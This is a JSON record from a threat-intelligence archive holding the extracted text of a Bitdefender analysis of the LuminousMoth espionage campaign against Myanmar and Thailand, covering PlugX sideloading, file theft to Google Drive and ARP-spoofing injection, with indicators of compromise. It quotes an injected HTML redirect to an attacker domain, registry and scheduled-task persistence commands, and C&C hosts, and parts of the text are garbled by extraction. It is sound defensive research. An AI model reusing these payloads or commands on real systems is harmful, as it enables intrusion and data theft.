@@ -1,0 +1,259 @@
+{
+    "id": "c44cbf46-8065-4a68-892d-c794ee2dabb7",
+    "created_at": "2023-01-12T15:08:40.34797Z",
+    "updated_at": "2025-03-27T02:16:47.028114Z",
+    "deleted_at": null,
+    "sha1_hash": "054c5e522469a1fb454f92539aaddcc704266733",
+    "title": "2021-07-21 - LuminousMoth – PlugX, File Exfiltration and Persistence Revisited",
+    "authors": "",
+    "file_creation_date": "2022-05-27T21:48:34Z",
+    "file_modification_date": "2022-05-27T21:48:34Z",
+    "file_size": 373937,
+    "plain_text": "# LuminousMoth – PlugX, File Exfiltration and Persistence Revisited\n\n**bitdefender.com/blog/labs/luminousmoth-plugx-file-exfiltration-and-persistence-revisited**\n\n[Anti-Malware Research](http://10.10.0.46/blog/labs/tag/antimalware-research/)\n\n9 min read\n\nOne product to protect all your devices, without slowing them down.\n\n[Free 90-day trial](http://10.10.0.46/media/html/consumer/new/get-your-90-day-trial-opt/index.html)\n\n## Foreword\n\nA few months ago, Bitdefender researchers started to investigate an extended operation that targeted victims from Myanmar and Thailand for\nwhat looked like cyber espionage and intelligence gathering.\n\n[Many aspects of this operation were recently comprehensively described in this article by the Kaspersky team, but we decided to present our](https://securelist.com/apt-luminousmoth/103332/)\nperspective on the operation and offer other IOCs we spotted.\n\nThe investigation started with our usual triage process where we observed suspicious activity of two processes;\n```\n C:\\Users\\Public\\Music\\WinWord.exe and C:\\ProgramData\\Msolutions\\svmetrics.exe . As a result, we were able to identify an\n\n```\ninfection vector and we collected the tools and TTPs specific to this operation.\n\nWe analyzed the chain of events and traced the start of the infection on some victims to the file `C:\\Users\\<user>\\Downloads\\COVID-19`\n```\n Case 12-11-2020(MOTC)\\COVID-19 Case 12-11-2020(1).exe, the creation of which corresponds to 2020-11-12 08:21. This file is a\n\n```\nlegitimate WinWord.exe executable vulnerable to sideloading.\n\nThe actions on behalf of this `COVID-19 Case 12-11-2020(1).exe we were able to reconstruct are:`\n\nIt copies itself as `C:\\Users\\Public\\Music\\WinWord.exe`\nIt installs persistence by creating the “Microsof” key value under the Run registry assigning the\n```\n    C:\\Users\\Public\\Music\\WinWord.exe value\n\n```\nIt starts communicating with the CobaltStrike C&C `www.updatecatalogs.com`\n\nMore details on tools and TTPs can be found in the sections below.\n\n## Key Findings\n\nPreviously unreported payload in the form of the well known Remote Access Tool PlugX\n\n\n-----\n\nata e t at o ca ed t oug Goog e e\nMore tools used for data collection\nthe attackers perform HTML code injection using ARP spoofing to redirect the victim to a page hosted by the threat actor\nExtra findings suggesting that LuminousMoth is connecting to Mustang Panda\nSome more examples of binaries vulnerable to sideloading used in this attack\nSome more examples of persistence mechanisms\nMore IOCs associated with this operation\n\n## Fmtoptions.dll and Plugx\n\nWe were able to link the `C:\\ProgramData\\Msolutions\\svmetrics.exe process with the` `C:\\Users\\Public\\Music\\WinWord.exe, and`\nwith the current operation, as we have evidence that svmetrics.exe executed more than once the `C:\\Users\\Public\\Music\\WinWord.exe`\nfile, the one that was initially copied by the `COVID-19 Case 12-11-2020(1).exe alongside the malicious wwlib.dll.`\n\nThe svmetrics.exe (InternalName from version info: `fmtoptions.exe ) is vulnerable to sideloading and is abused to load`\n```\nFmtoptions.dll .\n\n```\nAnalyzing the malicious Fmtoptions.dll file, we established that they read the content of a `walk.dat file and decrypt the shellcode that is,`\nsubsequently, executed. The shellcode is responsible for decompressing and loading the final payload, the PlugX implant, that represents a\nDLL with the damaged MZ and PE magic values. More details on the recovered payloads are presented in the following table:\n\nSHA256 C&C address\n\n9ed86767433b8d26e5b32a5d391f3f08f72dfafd6c7bf652e21e6af5b12b6e3b webmail.mmtimes[.]net\n\n4455a042e511f1c88f39cdd4c93c099af45493aa0cd8e3d40806ac2995da0907 myanmar.flymna[.]net\n\nIt’s worth noting that all tools and commands mentioned in the following sections are executed by the svmetrics.exe process that hosts the\nPlugX implant.\n\n## File Collection\n\nDuring our research, we noticed the execution of the `C:\\Users\\Public\\Downloads\\unsecapp.exe, a legitimate` `ESET EHttpSrv.exe file`\nthat is abused to load `http_dll.dll . The sample of` `http_dll.dll we identified implements the file collection feature.`\n\nAfter loading the malicious DLL file, the ini file `C:\\Users\\Public\\Downloads\\BITS.ini is parsed using` `GetPrivateProfileIntW and`\n```\nGetPrivateProfileStringW to obtain three parameters, as follows:\n\n```\nAppName KeyName Note\n\nRAM CreateRAM An integer that indicates the maximum of days after the creation time of the file. If that limit is exceeded for a\nfile, it will not be collected. The default value is 60.\n\nRAM ModifyRAM An integer that indicateds the maximum of days after the last write time of the file. If that limit is exceeded for a\nfile, it will not be collected. The default value is 60.\n\nKINDINF FLIN The username targeted for exfiltration. It will recursively list folders under the C:\\Users\\<username>\\.\n\nThe malware, then, creates a folder using the current time and the format string `“%Y-%m-%d %H-%M-%S” in the`\n```\n“C:\\Users\\Public\\Downloads\\” where all files will be staged. It starts scanning for files in the folders Documents, Desktop and\n\n```\nDownloads belonging to the specified user in the “FLIN” string. It also scans for files on all drives except the `C:\\ drive and all CDROM ones.`\n\nAnother technical detail worthy of note is the mechanism used to ensure that all files are unique in the staging folder. The MD5 hash for each\nfile is calculated and it is checked if the hash is not contained in a vector with all previous hashes. If not, it will be stored in the vector and will\nbe written into the `C:\\Users\\Public\\Downloads\\Background-Intelligent-Transfer-Service.bin file as a hex string. Each time the`\nDLL is executed, the content of the file with MD5 hashes is parsed and the vector of hashes is populated. The targeted files are those with the\nfollowing extensions:\n```\n.doc, .docx, .pdf, .xlsx, .exe\n\n```\nA noteworthy turn took place on 2021-03-09 when the svmetrics.exe executed another interesting piece of malware – `C:\\Users\\`\n```\n<username>\\AppData\\Roaming\\Zoom\\ZoomVideoApp.exe . The ZoomVideoApp.exe implements the same collection function, but with\n\n```\nmore features, as it automatically archives the staging folder and exfiltrates the files to the C&C. The sample was analyzed in Kaspersky's\n\n\n-----\n\nb ogpost\n\nThere are many differences between the `http_dll.dll and` `ZoomVideoApp.exe, but both of these samples use an ini file for customizing`\nthe behavior, the common parameters by functionality being “meeting” and “ssb_sdk” as they are equivalent to the “CreateRAM” and\n“ModifyRAM”, respectively.\n\nThe deployment of the `ZoomVideoApp.exe can be interpreted as an update to the collection and exfiltration mechanism, as for the files`\ncollected by the http_dll.dll, the attackers were forced to manually archive and exfiltrate the files.\n\n## File Exfiltration\n\nThe attackers deployed another piece of malware to exfiltrate files, as we noticed the execution of a binary from an unusual location having\nan archive name and an authentication token as parameters from the command line. The files were put into an archive created using the\nrar.exe utility.\n\nThe process `C:\\Kpcms\\Send1.exe was executed multiple times by the` `svmetrics.exe . After analysis, we concluded that the sample`\nuploads the files to Google Drive as it uses the endpoint `https://www.googleapis.com/upload/drive/v3/files?uploadType=media to`\nperform a simple upload. According to the documentation of the endpoint, it is used for the transfer of files that are smaller than 5MB. To\nbypass this limitation, the attackers were forced to split the archive into multiple parts and upload each one as suggested by the archives\nnames that we encounter.\n\nThis limitation was fixed into a new version of the tool as the attackers start to use another sample, `C:\\ProgramData\\Adobe\\Send3.exe, for`\nthe same purpose. The major improvement of the tool was the use of a resumable upload mechanism to upload files bigger than 5MB. New\ncommand line parameters were introduced like the one for specifying the chunk size, which allows the uploading of the file by performing\nmultiple HTTP PUT operations. There is also an option for resuming an upload by specifying the `UploadID and for checking if the upload`\nwas successful.\n\nAfter the deploying ZoomVideoApp.exe, the tool wasn’t seen in use anymore, probably because of the exfiltration capabilities of the\nZoomVideoApp.exe.\n\n## ArpSpoof and html injection\n\nAfter finding that svmetrics.exe executed the `C:\\ProgramData\\Adobe\\Send3.exe and` `C:\\ProgramData\\Adobe\\GetChromeCookies.exe`\non one victim, we took a closer look on files from the `C:\\ProgramData\\Adobe\\ as it seems to be a location where the attackers staged`\nmany tools. As a result, we noticed the `C:\\ProgramData\\adobe\\arpspoof.exe file.`\n\nOur analysis of this file found that the location path links to the attackers, and found many other details that will be mentioned below.\n\n[Thanks to the RTTI information, we established that the arpspoof.exe is actually a modified build of https://github.com/sin5678/zxarps](https://github.com/sin5678/zxarps)\nand it was customized to receive from command line an IP and a PORT and to inject a HTML code into the HTTP responses received from\nthat `IP:PORT using the ARP spoofing and packet capturing using Winpcap. The particular HTML is hardcoded into the binary itself and is`\nsimilar to:\n```\n<html><body><script>window.location.href=\"http://microsoft.updatecatalogs[.]com/Microsoft Update Catalog.htm\"</script></body>\n</html>\n\n```\nWe analyzed the sample and compared it with the code from GitHub, and we noticed another custom modification in the\n```\nCARPSpoof::HackHtml function:\n\n```\n\n-----\n\nAs can be seen from the image, the HTML will be injected only into the responses that have the 200-status code and don’t contain the strings\n```\n“2.58.230.5”, “content-google:” and “X-AspNet-Version: 4.0.30319\\r\\n”\n\n```\nThe injected HTML intends to redirect the user to `http://microsoft.updatecatalogs.com/Microsoft Update Catalog.htm` - a web\npage belonging to the attackers, as the domain `updatecatalogs.com` is a known C&C for the Cobalt Strike beacon.\n\nAnother interesting thing is the `2.58.230.5 IP and the fact that the tool skips injection into the http responses from that IP, probably`\nbecause that IP was part of the attacker’s infrastructure. Moreover, at the time of this writing, the domain `new.mmtimes.org is resolved to`\nthat IP and it is pretty similar to the `mmtimes.net` found in the PlugX sample. The `mmtimes.org` was already mentioned in the Kaspersky\nreport as being used in earlier operations performed by Mustang Panda, and therefore, the arpspoof.exe, the malicious URL\n\n`http://microsoft.updatecatalogs[.]com/Microsoft Update Catalog.htm` from the injected HTML code and the `2.58.230.5 IP`\naddress to which the domain `mmtimes.org resolves to, suggest that the LuminousMoth and Mustang Panda, are connected.`\n\n## More sideloading\n\nThere are certainly more tools used by actors in this operation as, beside the fmtoptions.exe, WinWord.exe and igfxEM.EXE files vulnerable\nto sideloading, we found two other vulnerable binaries abused to load a malicious DLL file.\n\nThe first case we want to address is `C:\\Users\\Public\\Music\\VSTOInstaller.exe, which was executed by the same svmetrics.exe. This`\nsample of Visual Studio Tools for Office Solution Installer loads the vstoloader.dll and the malicious DLL loaded this way is\n\n`C:\\Users\\Public\\music\\vstoloader.dll that extracts a shellcode from the` `ret.bin` file and executes it. Unfortunately, we weren’t able\nto obtain the `ret.bin file, so we don’t know what role the tool might have.`\n\nBeing executed by the same svmetrics.exe process, the `C:\\Intel\\install\\stay\\AtlTraceTool8.exe is another legitimate binary abused`\nby the attackers. The only thing we were able to establish about this binary is that it loads the malicious `C:\\Intel\\install\\stay\\1033\\`\n```\nAtlTraceToolUI.dll, but the file could not be obtained.\n\n## Persistence\n\n```\nThe data we gathered suggests at least two of the tools we encounter are setting up persistence:\n\nRegistry Key Registry Value Value\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Microsof C:\\Users\\Public\\Music\\WinWord.exe\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run UIMetrics C:\\ProgramData\\Msolutions\\svmetrics.exe\n\nWe also spotted the persistence setup via the svmetrics.exe for a few tools:\n\n\nschtasks.exe /create /sc onstart /ru system /tn MicrosoftOneDirve /tr C:\\Intel\\install\\stay\\AtlTraceTool8.exe\" \"-svc /F\n\n\n-----\n\nREG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Zoom\" /t REG_SZ /d \"C:\\Users\\\n<username>\\AppData\\Roaming\\Zoom\\ZoomVideoApp.exe\" /F\n\n\nREG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v BGClient /t REG_SZ /d\n\"c:\\Users\\Public\\Music\\VSTOInstaller.exe\" /F\n\n\n## Indicators of Compromise\n\n_Binaries exploited for sideloading_\n\nFile path SHA256 Note\n\nC:\\Users\\Public\\Music\\WinWord.exe 8cfb55087fa8e4c1e7bcc580d767cf2c884c1b8c890ad240c1e7009810af6736 Winword from mic\nthat loads wwlib.d\n\nC:\\ProgramData\\Msolutions\\svmetrics.exe f9558aae2ad658885c071975a6efd055e3324717a32ddf551c5760afe766204e FmtOptions.exe fr\nSoftware Inc.; load\nfmtoptions.dll\n\nC:\\Users\\Public\\Downloads\\unsecapp.exe c3159d4f85ceb84c4a0f7ea9208928e729a30ddda4fead7ec6257c7dd1984763 ESET EHttpSrv.ex\nhttp_dll.dll\n\nC:\\Users\\Public\\Music\\VSTOInstaller.exe fc73a301bf3167cb01e966df1bb0d20ca922ea831298ab85b4301347c6b5df10 Visual Studio Too\nSolution Installer;\nvstoloader.dll\n\nC:\\Intel\\install\\stay\\AtlTraceTool8.exe 197d0ad8e3f6591e4493daaee9e52e53ecf192e32f9d167c67f2ffb408c76f2c Microsoft ATL Tra\nloads\n1033\\AtlTraceToo\n\n_Files used by attackers_\n\nSHA256 Filename\n\n82134a024e98e9bde134b8294f2b346cef300202203e88229718967f52becc78 fmtoptions.dll\n\nf75457c62e1f65bfd0b16cd74cecb0325837a7b615378218bd2571818b3dcb46 fmtoptions.dll\n\nccf48d55f99a2bc1f91a92d8afa7ad61559911ff5f4e5e85cbab1177c2581d41 vstoloader.dll\n\n6f20eaca6e9fb4e91826081dd0af81e4dcc2f7c82879f8ba16dea26400963931 http_dll.dll\n\n869e7da2357c673dab14e9a64fb69691002af5b39368e6d1a3d7fda242797622 version.dll\n\n95bcc8c3d9d23289b4ff284cb685b741fe92949be35c69c1faa3a3846f1ab947 wwlib.dll\n\n37b8c0c8664763ecabaed434f98abc3ae2ac8a6a2a09dc395b46196da050c091 getchromecookies.exe\n\n11996a32e5449cca1d8e82b6c43a625913b235d57a4f3e01f560f332cb221931 getchromecookies.exe\n\nb58fdb9b77e11da524d6518634ea31c3c2d1b2625cb009781f310478e98cfb3a Send1.exe\n\ne826209f6adccc90959bc515598eddd91b61948b115c08257b263e13882aed83 Send3.exe\n\n85d7c880f658e49a56781959e375d46861b87fcee6db17952dcb4530eb4bacd9 arpspoof.exe\n\n361ccc35f7ff405eb904910de126a5775de831b4229a4fdebfbacdd941ad3c56 ZoomVideoApp.exe\n\n\n-----\n\n9ed86767433b8d26e5b32a5d391f3f08f72dfafd6c7bf652e21e6af5b12b6e3b PlugX sample (myanmar.flymna[.]net C&C address)\n\n4455a042e511f1c88f39cdd4c93c099af45493aa0cd8e3d40806ac2995da0907 PlugX sample (webmail.mmtimes[.]net C&C address)\n\nbd7a0507f10f92a14f9bbfd708d7821d036342ad78c39537fe0bebeef96f9139 CobaltStrike Beacon (103.15.28[.]195 C&C address)\n\nad50056093467987270b6c560734b59c35edadfbc38d76ca4d6199fc70595446 CobaltStrike Beacon (www.updatecatalogs[.]com C&C\naddress)\n\n_URL used in injected HTML code_\n```\nhttp://microsoft.updatecatalogs.com/Microsoft Update Catalog.htm\n\n```\n\n_Malicious domains_\n\n\nwww.updatecatalogs[.]com\n\n\nmicrosoft.updatecatalogs[.]com\n\n\nwebmail.mmtimes[.]net\n\n\nmyanmar.flymna[.]net\n\n\nnew.mmtimes[.]org\n\n\n_Malicious IPs_\n\n\n103.15.28[.]195\n\n\n2.58.230[.]5\n\n\n**TAGS**\n\n[anti-malware research](http://10.10.0.46/blog/labs/tag/antimalware-research/)\n\n**AUTHOR**\n\n## Bogdan BOTEZATU\n\nInformation security professional. Living my second childhood at @Bitdefender as director of threat research.\n\n[View all posts](http://10.10.0.46/blog/labs/author/bbotezatu/)\n\n## Victor VRABIE\n\nVictor VRABIE is a security researcher at Bitdefender Iasi, Romania. Focusing on malware research, advanced persistent threats and\ncybercrime investigations, he's also a graduate of Computer Sciences.\n\n[View all posts](http://10.10.0.46/blog/labs/author/vvrabie/)\n\n\n## Victor VRABIE\n\n[View all posts](http://10.10.0.46/blog/labs/author/vvrabie/)\n\n\n-----\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-07-21 - LuminousMoth – PlugX, File Exfiltration and Persistence Revisited.pdf"
+    ],
+    "report_names": [
+        "2021-07-21 - LuminousMoth – PlugX, File Exfiltration and Persistence Revisited.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "7c00086d-9535-4552-8201-1dd725e41b12",
+            "created_at": "2023-04-26T02:03:03.128736Z",
+            "updated_at": "2025-03-27T02:00:55.516541Z",
+            "deleted_at": null,
+            "main_name": "LuminousMoth",
+            "aliases": [
+                "LuminousMoth"
+            ],
+            "source_name": "MITRE:LuminousMoth",
+            "tools": [
+                "PlugX",
+                "Cobalt Strike"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "92049df8-7902-48e8-ad17-97398b923698",
+            "created_at": "2022-10-25T16:07:23.81315Z",
+            "updated_at": "2025-03-27T02:02:09.990217Z",
+            "deleted_at": null,
+            "main_name": "LuminousMoth",
+            "aliases": [],
+            "source_name": "ETDA:LuminousMoth",
+            "tools": [
+                "Agentemis",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "cobeacon"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "610a7295-3139-4f34-8cec-b3da40add480",
+            "created_at": "2023-01-06T13:46:38.608142Z",
+            "updated_at": "2025-03-27T02:00:02.87217Z",
+            "deleted_at": null,
+            "main_name": "Cobalt",
+            "aliases": [
+                "Cobalt Gang",
+                "GOLD KINGSWOOD",
+                "COBALT SPIDER",
+                "G0080",
+                "Mule Libra",
+                "Cobalt Group"
+            ],
+            "source_name": "MISPGALAXY:Cobalt",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "1691c25f-1aa4-4168-8ce2-7aa8f23246e7",
+            "created_at": "2024-06-04T02:03:07.724221Z",
+            "updated_at": "2025-03-27T02:05:17.284601Z",
+            "deleted_at": null,
+            "main_name": "BRONZE PRESIDENT",
+            "aliases": [
+                "Mustang Panda ",
+                "Red Lich ",
+                "Temp.Hex ",
+                "HoneyMyte "
+            ],
+            "source_name": "Secureworks:BRONZE PRESIDENT",
+            "tools": [
+                " Cobalt Strike",
+                " ORat",
+                " PlugX",
+                " RCSession",
+                "China Chopper"
+            ],
+            "source_id": "Secureworks",
+            "reports": null
+        },
+        {
+            "id": "b69037ec-2605-4de4-bb32-a20d780a8406",
+            "created_at": "2023-01-06T13:46:38.790766Z",
+            "updated_at": "2025-03-27T02:00:02.919758Z",
+            "deleted_at": null,
+            "main_name": "MUSTANG PANDA",
+            "aliases": [
+                "TEMP.HEX",
+                "TA416",
+                "TANTALUM",
+                "Twill Typhoon",
+                "Earth Preta",
+                "Stately Taurus",
+                "LuminousMoth",
+                "Polaris",
+                "BRONZE PRESIDENT",
+                "HoneyMyte",
+                "Red Lich"
+            ],
+            "source_name": "MISPGALAXY:MUSTANG PANDA",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "9baa7519-772a-4862-b412-6f0463691b89",
+            "created_at": "2022-10-25T15:50:23.354429Z",
+            "updated_at": "2025-03-27T02:00:55.45162Z",
+            "deleted_at": null,
+            "main_name": "Mustang Panda",
+            "aliases": [
+                "Mustang Panda",
+                "TA416",
+                "RedDelta",
+                "BRONZE PRESIDENT"
+            ],
+            "source_name": "MITRE:Mustang Panda",
+            "tools": [
+                "Cobalt Strike",
+                "RCSession",
+                "NBTscan",
+                "PoisonIvy",
+                "PlugX"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "2ee03999-5432-4a65-a850-c543b4fefc3d",
+            "created_at": "2022-10-25T16:07:23.882813Z",
+            "updated_at": "2025-03-27T02:02:10.0116Z",
+            "deleted_at": null,
+            "main_name": "Mustang Panda",
+            "aliases": [
+                "Bronze President",
+                "Camaro Dragon",
+                "Earth Preta",
+                "HoneyMyte",
+                "Mustang Panda",
+                "Operation SMUGX",
+                "Operation SmugX",
+                "PKPLUG",
+                "Red Lich",
+                "Stately Taurus",
+                "TEMP.Hex"
+            ],
+            "source_name": "ETDA:Mustang Panda",
+            "tools": [
+                "9002 RAT",
+                "AdFind",
+                "Agent.dhwf",
+                "Agentemis",
+                "CHINACHOPPER",
+                "China Chopper",
+                "Chymine",
+                "ClaimLoader",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "DCSync",
+                "DOPLUGS",
+                "Darkmoon",
+                "Destroy RAT",
+                "DestroyRAT",
+                "Farseer",
+                "Gen:Trojan.Heur.PT",
+                "HOMEUNIX",
+                "Hdump",
+                "HenBox",
+                "HidraQ",
+                "Hodur",
+                "Homux",
+                "HopperTick",
+                "Hydraq",
+                "Impacket",
+                "Kaba",
+                "Korplug",
+                "LadonGo",
+                "MQsTTang",
+                "McRAT",
+                "MdmBot",
+                "Mimikatz",
+                "NBTscan",
+                "NetSess",
+                "Netview",
+                "Orat",
+                "POISONPLUG.SHADOW",
+                "PUBLOAD",
+                "PVE Find AD Users",
+                "PlugX",
+                "Poison Ivy",
+                "PowerView",
+                "QMAGENT",
+                "RCSession",
+                "RedDelta",
+                "Roarur",
+                "SPIVY",
+                "ShadowPad Winnti",
+                "SinoChopper",
+                "Sogu",
+                "TIGERPLUG",
+                "TONEINS",
+                "TONESHELL",
+                "TVT",
+                "TeamViewer",
+                "Thoper",
+                "TinyNote",
+                "WispRider",
+                "WmiExec",
+                "XShellGhost",
+                "Xamtrav",
+                "Zupdax",
+                "cobeacon",
+                "nbtscan",
+                "nmap",
+                "pivy",
+                "poisonivy"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673536120,
+    "ts_updated_at": 1743041807,
+    "ts_creation_date": 1653688114,
+    "ts_modification_date": 1653688114,
+    "files": {
+        "pdf": "https://archive.orkl.eu/054c5e522469a1fb454f92539aaddcc704266733.pdf",
+        "text": "https://archive.orkl.eu/054c5e522469a1fb454f92539aaddcc704266733.txt",
+        "img": "https://archive.orkl.eu/054c5e522469a1fb454f92539aaddcc704266733.jpg"
+    }
+}
